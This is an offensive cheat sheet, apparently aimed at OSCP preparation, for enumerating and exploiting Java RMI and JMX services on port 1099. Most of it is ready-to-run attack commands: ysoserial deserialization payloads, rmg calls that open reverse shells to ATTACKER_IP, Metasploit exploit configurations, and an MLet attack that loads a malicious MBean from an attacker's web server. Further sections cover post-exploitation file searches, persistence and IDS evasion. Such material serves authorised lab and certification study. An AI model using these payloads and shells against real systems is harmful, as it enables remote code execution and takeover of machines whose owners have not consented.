# Port 1099 - Java RMI Enumeration & Exploitation

## Service Information

**Port:** 1099/TCP (default), can run on any port
**Service:** Java RMI (Remote Method Invocation)
**Protocol:** Java remote object invocation
**Security:** ⚠️ Deserialization vulnerabilities, RCE common

---

## 1. Basic Enumeration

### 1.1 Nmap Scan

```bash
# Basic scan
nmap -p 1099 -sV TARGET_IP

# Detailed scan with scripts
nmap -p 1099 -sV -sC TARGET_IP

# RMI specific scripts
nmap -p 1099 --script rmi-* TARGET_IP

# RMI registry dump
nmap -p 1099 --script rmi-dumpregistry TARGET_IP

# Full port scan (RMI can run on any port)
nmap -p- --open TARGET_IP | grep -i rmi
```

### 1.2 Banner Grabbing

```bash
# Netcat (limited for RMI)
nc -nv TARGET_IP 1099

# telnet
telnet TARGET_IP 1099

# Nmap version detection
nmap -p 1099 -sV --version-intensity 9 TARGET_IP
```

---

## 2. RMI Registry Enumeration

### 2.1 List Remote Objects

```bash
# Using rmg (Remote Method Guesser)
# Download: https://github.com/qtc-de/remote-method-guesser
rmg enum TARGET_IP 1099

# Output shows:
# - Bound names (registered objects)
# - Classes and methods
# - Remote interfaces

# Example output:
# [+] RMI registry bound names:
# - jmxrmi
# - main
```

### 2.2 Nmap RMI Dump

```bash
# Dump RMI registry
nmap -p 1099 --script rmi-dumpregistry TARGET_IP

# Example output:
# PORT     STATE SERVICE
# 1099/tcp open  rmiregistry
# | rmi-dumpregistry:
# |   jmxrmi
# |     javax.management.remote.rmi.RMIServerImpl_Stub
# |   main
# |_    java.rmi.server.RemoteObjectInvocationHandler
```

---

## 3. JMX (Java Management Extensions) Enumeration

### 3.1 Detect JMX Service

```bash
# JMX usually binds to RMI registry
nmap -p 1099 --script rmi-dumpregistry TARGET_IP | grep -i jmx

# Common JMX names:
# - jmxrmi
# - jmxconnector
# - jmx
```

### 3.2 JMX Connect & Enum

```bash
# Using jmxterm
# Download: https://github.com/jiaqi/jmxterm
java -jar jmxterm.jar

# In jmxterm:
open TARGET_IP:1099
domains
beans

# List MBeans
beans -d java.lang

# Get bean info
info -b java.lang:type=Memory
```

### 3.3 Metasploit JMX Scanner

```bash
msfconsole
use auxiliary/scanner/misc/java_jmx_server
set RHOSTS TARGET_IP
set RPORT 1099
run
```

---

## 4. Exploitation - Deserialization

### 4.1 ysoserial - Java Deserialization

```bash
# Download ysoserial
# https://github.com/frohoff/ysoserial

# Generate payload (CommonsCollections)
java -jar ysoserial.jar CommonsCollections6 "nc -e /bin/bash ATTACKER_IP 4444" > payload.bin

# Use rmg to exploit
rmg call TARGET_IP 1099 "METHOD_NAME" --signature "SIGNATURE" --payload payload.bin

# Or use metasploit (simpler)
```

### 4.2 Metasploit RMI Exploitation

```bash
msfconsole

# Java RMI Server Insecure Default Configuration
use exploit/multi/misc/java_rmi_server
set RHOSTS TARGET_IP
set RPORT 1099
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
exploit
```

### 4.3 rmg (Remote Method Guesser) Exploitation

```bash
# Enum + exploit workflow

# 1. Enumerate registry
rmg enum TARGET_IP 1099

# 2. Guess methods
rmg guess TARGET_IP 1099

# 3. Known gadget scan
rmg scan TARGET_IP 1099

# 4. Exploit with payload
rmg call TARGET_IP 1099 'METHOD' --signature 'SIGNATURE' --payload CommonsCollections6 "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
```

---

## 5. JMX Exploitation

### 5.1 MLet Attack (Load Malicious MBean)

```bash
# 1. Create malicious MBean JAR
# Create Exploit.java:
import javax.management.*;
import java.io.*;

public class Exploit implements ExploitMBean {
    public void runCommand(String cmd) throws Exception {
        Runtime.getRuntime().exec(cmd);
    }
}

# Compile and JAR
javac Exploit.java
jar cvf exploit.jar Exploit.class

# 2. Create MLet file (exploit.mlet):
<HTML>
<mlet code="Exploit" archive="exploit.jar" name="Exploit:name=exploit"/>
</HTML>

# 3. Host JAR and MLet on webserver
python3 -m http.server 80

# 4. Connect with jmxterm
java -jar jmxterm.jar
open TARGET_IP:1099

# 5. Load MLet
bean javax.management.loading:type=MLet
run loadMLet http://ATTACKER_IP/exploit.mlet

# 6. Execute command
bean Exploit:name=exploit
run runCommand "nc -e /bin/bash ATTACKER_IP 4444"
```

### 5.2 Metasploit JMX Exploitation

```bash
msfconsole

# Java JMX Server Insecure Configuration
use exploit/multi/misc/java_jmx_server
set RHOSTS TARGET_IP
set RPORT 1099
set JMX_ROLE admin
set JMX_PASSWORD admin
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
exploit
```

---

## 6. RMI Registry Attack

### 6.1 RMI Registry Bind Attack

```bash
# Bind malicious object to registry
# Requires ability to bind to registry (less common)

# Using custom Java code:
# 1. Create malicious remote object
# 2. Bind to registry
# 3. Wait for victim to lookup object
```

### 6.2 Codebase Attack

```bash
# Exploit java.rmi.server.codebase property
# If set, RMI loads classes from remote URL

# Using rmg
rmg codebase TARGET_IP 1099 http://ATTACKER_IP/ Exploit

# Steps:
# 1. Create Exploit.class with malicious code
# 2. Host on HTTP server
# 3. Trigger RMI to load from codebase
```

---

## 7. Common Vulnerabilities

### 7.1 CVE-2016-3427 (JMX Deserialization)

```bash
# Oracle JMX vulnerability
# Affects Oracle Java SE 6u113, 7u97, 8u77 and earlier

# Metasploit
use exploit/multi/misc/java_jmx_server
set RHOSTS TARGET_IP
exploit
```

### 7.2 CVE-2017-3241 (RMI Registry)

```bash
# RMI Registry remote code execution
# Affects Java SE 6u131, 7u121, 8u112

# Check version
nmap -p 1099 -sV --version-intensity 9 TARGET_IP
```

---

## 8. Post-Exploitation

### 8.1 After Getting Shell

```bash
# Check Java version
java -version

# Find Java processes
ps aux | grep java

# Check for other RMI services
netstat -tlnp | grep java

# Look for config files
find / -name "*.properties" 2>/dev/null | grep -i java
find / -name "*.xml" 2>/dev/null | grep -i tomcat

# Check environment variables
env | grep -i java
```

### 8.2 Persistence via RMI

```bash
# If you have write access to RMI service config:

# Add malicious MBean that loads on startup
# Modify JMX configuration
# Add backdoor to Java classpath
```

---

## 9. Detection Evasion

### 9.1 Stealth Enumeration

```bash
# Slow scans to avoid IDS
nmap -p 1099 -T1 TARGET_IP

# Avoid known exploit signatures
# Use custom payloads instead of ysoserial defaults
```

### 9.2 Legitimate-Looking Traffic

```bash
# Use jconsole or jvisualvm to blend in
# These are legitimate Java monitoring tools
jconsole TARGET_IP:1099
```

---

## 10. Tools Overview

| Tool | Purpose | Command |
|------|---------|---------|
| Nmap | Service detection | `nmap -p 1099 --script rmi-* TARGET` |
| rmg | RMI enumeration/exploitation | `rmg enum TARGET 1099` |
| Metasploit | Automated exploitation | `use exploit/multi/misc/java_rmi_server` |
| ysoserial | Deserialization payloads | `java -jar ysoserial.jar CommonsCollections6 CMD` |
| jmxterm | JMX interaction | `java -jar jmxterm.jar` |
| BaRMIe | RMI vulnerability scanner | `java -jar BaRMIe.jar -enum TARGET 1099` |

---

## 11. Advanced Tools

### 11.1 BaRMIe

```bash
# Download: https://github.com/NickstaDB/BaRMIe
java -jar BaRMIe.jar -enum TARGET_IP 1099

# Outputs:
# - RMI endpoints
# - Deserialization gadgets
# - Attack surface

# Attack mode
java -jar BaRMIe.jar -attack TARGET_IP 1099
```

### 11.2 rmiscout

```bash
# RMI enumeration tool
# https://github.com/BishopFox/rmiscout

./rmiscout.sh wordlist.txt TARGET_IP 1099

# Brute force RMI method names
# Helps identify hidden RMI methods
```

---

## 12. Quick Reference

### Quick Enumeration
```bash
# Nmap scan
nmap -p 1099 --script rmi-dumpregistry TARGET_IP

# rmg enum
rmg enum TARGET_IP 1099

# Check for JMX
nmap -p 1099 --script rmi-dumpregistry TARGET_IP | grep -i jmx
```

### Quick Exploitation
```bash
# Metasploit RMI
use exploit/multi/misc/java_rmi_server
set RHOSTS TARGET_IP
set PAYLOAD java/meterpreter/reverse_tcp
exploit

# ysoserial + rmg
java -jar ysoserial.jar CommonsCollections6 "nc -e /bin/bash ATTACKER_IP 4444" > p.bin
rmg call TARGET_IP 1099 METHOD --payload p.bin
```

### JMX Exploitation
```bash
# jmxterm
java -jar jmxterm.jar
open TARGET_IP:1099
domains
beans
```

---

## 13. OSCP Tips

⚠️ **Java RMI Priority for OSCP:**
- **High impact** - Often leads to direct RCE
- Usually runs as high-privilege user (root/SYSTEM)
- Check port 1099 FIRST if open
- Metasploit module works well for OSCP
- Deserialization = Easy wins
- JMX often has no authentication
- Look for other Java services (Tomcat, JBoss)

**Common OSCP scenarios:**
1. RMI on 1099 → Metasploit RMI exploit → Root shell
2. JMX without authentication → MLet attack → RCE
3. Tomcat + RMI → Combined exploitation
4. Java application server → RMI backend exploitation

**Quick Win:**
```bash
# Try this first:
msfconsole -q -x "use exploit/multi/misc/java_rmi_server; set RHOSTS TARGET_IP; set LHOST ATTACKER_IP; exploit"
```

---

## 14. Default Ports

| Service | Port | Description |
|---------|------|-------------|
| RMI Registry | 1099 | Default RMI registry |
| JMX RMI | 1099 | JMX over RMI (default) |
| JMX Remote | 9010 | JMX remote objects |
| Tomcat JMX | 9012 | Tomcat JMX |
| JBoss Remoting | 1098 | JBoss RMI |
| RMI Activation | 1098 | RMI activation daemon |

---

## 15. Common JMX Ports

```bash
# Scan for common Java/JMX ports
nmap -p 1098,1099,1100,4444,8686,9010,9990,11099,47001,47002 TARGET_IP

# JBoss
1090, 1098, 1099, 4444, 4445, 4446, 8080, 8009, 8083, 8093

# Tomcat
8080, 8009, 1099, 9012

# WebLogic
7001, 7002, 8001, 9002
```

---

## 16. Troubleshooting

```bash
# Connection refused
# Solution: Check if service is actually RMI
nmap -p 1099 -sV TARGET_IP

# No bound objects
# Solution: May need authentication or different port
rmg enum TARGET_IP 1099 --auth

# Exploit fails
# Solution: Try different ysoserial gadgets
# CommonsCollections1-7, Jdk7u21, JRMPClient, etc.
```

---

## 17. Resources

- **HackTricks RMI**: https://book.hacktricks.xyz/network-services-pentesting/1099-pentesting-java-rmi
- **rmg GitHub**: https://github.com/qtc-de/remote-method-guesser
- **ysoserial**: https://github.com/frohoff/ysoserial
- **BaRMIe**: https://github.com/NickstaDB/BaRMIe
- **Java RMI Exploitation**: https://www.exploit-db.com/docs/english/46052-rmi-exploitation-overview.pdf
